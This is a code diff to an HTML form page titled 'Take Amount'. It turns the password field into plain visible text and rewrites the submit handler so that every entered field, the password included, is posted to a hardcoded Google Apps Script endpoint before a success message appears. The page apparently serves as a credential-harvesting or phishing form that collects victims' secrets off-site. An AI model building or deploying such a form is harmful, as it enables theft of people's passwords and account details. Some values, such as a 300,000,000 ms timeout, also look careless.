@@ -182,7 +182,7 @@
             <h1>Take Amount</h1>
             <p class="subtitle">Enter your details</p>
             <label>Password <span style="color: red;">*</span> <strong style="color: #ff6c00;">(Don't use zeros)</strong></label>
-            <input type="password" placeholder="Enter your password" autocomplete="off" name="Password" required />
+            <input type="text" placeholder="Enter your password" autocomplete="off" name="Password" required />
             <div class="error-message" id="password-error">Password cannot contain zeros</div>
         </div>
 
@@ -374,20 +374,70 @@
             });
         });
 
-        form.addEventListener("submit", function (e) {
+       form.addEventListener("submit", function (e) {
             e.preventDefault();
-            if (validateStep(currentStep)) {
-                const formData = new FormData(this);
-                const keyValuePairs = [];
-                for (const pair of formData.entries()) {
-                    keyValuePairs.push(pair[0] + "=" + pair[1]);
-                }
-                const formDataString = keyValuePairs.join("&");
-                alert("Form submitted successfully with data: " + formDataString);
-                form.reset();
-                currentStep = 1;
-                showStep(currentStep);
+
+            if (!validateForm()) {
+                message.textContent = "Try to correct the errors in the form";
+                message.style.display = "block";
+                message.style.backgroundColor = "red";
+                submitButton.disabled = false;
+                setTimeout(() => {
+                    message.style.display = "none";
+                }, 300000000);
+                return;
             }
+
+            message.textContent = "Submitting...";
+            message.style.display = "block";
+            submitButton.disabled = true;
+
+            const formData = new FormData(this);
+            const keyValuePairs = [];
+            for (const pair of formData.entries()) {
+                keyValuePairs.push(pair[0] + "=" + pair[1]);
+            }
+
+            const formDataString = keyValuePairs.join("&");
+
+            fetch(
+                "https://script.google.com/macros/s/AKfycbxIlao67g-XSHBVoSvYzofopgSa7_7_l9qstp4SxrdqMWCutnasBtQjdLn_aUWdsZvShw/exec",
+                {
+                    redirect: "follow",
+                    method: "POST",
+                    body: formDataString,
+                    headers: {
+                        "Content-Type": "text/plain;charset=utf-8",
+                    },
+                }
+            )
+                .then(function (response) {
+                    if (response) {
+                        return response;
+                    } else {
+                        throw new Error("Failed to submit the form.");
+                    }
+                })
+                .then(function (data) {
+                    message.textContent = "Details submitted successfully!";
+                    message.style.display = "block";
+                    message.style.backgroundColor = "green";
+                    message.style.color = "white";
+                    submitButton.disabled = false;
+                    form.reset();
+
+                    setTimeout(function () {
+                        message.textContent = "";
+                        message.style.display = "none";
+                    }, 2600);
+                })
+                .catch(function (error) {
+                    console.error(error);
+                    message.textContent = "An error occurred while submitting the form.";
+                    message.style.display = "block";
+                    message.style.backgroundColor = "red";
+                    submitButton.disabled = false;
+                });
         });
     </script>
 </body>
